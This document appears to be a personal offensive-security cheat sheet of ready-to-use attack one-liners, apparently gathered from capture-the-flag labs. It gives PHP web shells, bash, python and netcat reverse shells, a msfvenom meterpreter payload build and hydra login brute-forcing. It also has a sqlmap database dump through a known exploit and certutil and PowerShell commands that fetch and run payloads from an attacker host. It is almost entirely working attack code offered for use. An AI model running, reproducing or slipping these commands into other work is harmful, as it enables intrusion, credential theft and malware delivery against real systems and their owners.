# Tips and Tricks

Just various bits of script and techniques I've found useful.

## Web shells

PHP one liner:

`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`

PHP interactive shell:

```
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<script>document.getElementById("cmd").focus();</script>
```

shell above emitted to a file via base64:

## Reverse shells

Bash (almost never works in my experience):

`bash -i >& /dev/tcp/192.168.1.4/4444 0>&1`

Python (almost always works in my experience):

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.136.49",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Netcat when you dont have the -e option (this actually worked once when the others didnt!):

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.102.174 4444 >/tmp/f`

## shell tricks

making a bad reverse shell better:

`python -c 'import pty; pty.spawn("/bin/bash")'`

bypassing url encoding if doing something sneaky like get[cmd]:

`echo urlencoded | base64 -d > shell.php`

creating a windows exe that will call home:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.100.16 LPORT=4443 -f exe -o callhome.exe`

## Brute forcing with hydra

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`

The below targets an aspx page, that needed viewstate to go with it in order to get the error message back:

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.aspx:__VIEWSTATE=pIru3H%2F3LYg1qp3lNSwHX1ALuENNV6tddZ32Zp4xRIs57ec4jlYH9sp8EHtZ0sp66EsCaToBXZLEbw62lNBT7XuKpv84ZHetBU3stATD5DYczl9JagBTENtoK%2B6lyNFyDsrRWb34%2F9jXclG%2FsQWa1tJXjQAYZJP2MJNhNaH2WMIL%2FQf9&__EVENTVALIDATION=lQWGlUQ0Fmhz%2BuiWoqOKaexWGfGTltskH%2FV3RsXfmd%2B8N5m8JCLGWXUm7pFZQj0G0QjJMd3MLudMx0zUAlot%2BanlZVtlggDnm3e%2B2DNiDwnhrETOWRZdwtNypSULvwzs8ZlD1SiHFFPASQz1PJN12l5Fi3uL4UCohXb%2BBjCo1nU5Sz7I&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`

## use sqlmap to exploit a blind sql vector (knowing which param and vector to use)

Raw sqlmap will go through all its tests, which might take ages. If you know the test to use, then you can actually specify it in the sqlmap command.

`sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --test-filter="MySQL >= 5.0 error-based - Parameter replace (FLOOR)" --random-agent --dump -p list[fullordering]`

In the above, exploiting https://www.exploit-db.com/exploits/42033, I know the param and the test that will work, so I specify both and jump straight to the dumping.

## downloading files from the windows command prompt

without the use of powershell or anything clever. great for pulling files off my attacker machine

```
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome.exe" callhome.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome2.exe" callhome2.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/winPEAS.bat" winPEAS.bat
```

with powershell (first also invokes a script, in this case Invoke-PowerShellTcp from Nishang):

`println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.100.16:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.100.16 -Port 4444".execute().text`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.139.149:8000/callhome.exe','callhome.exe')"`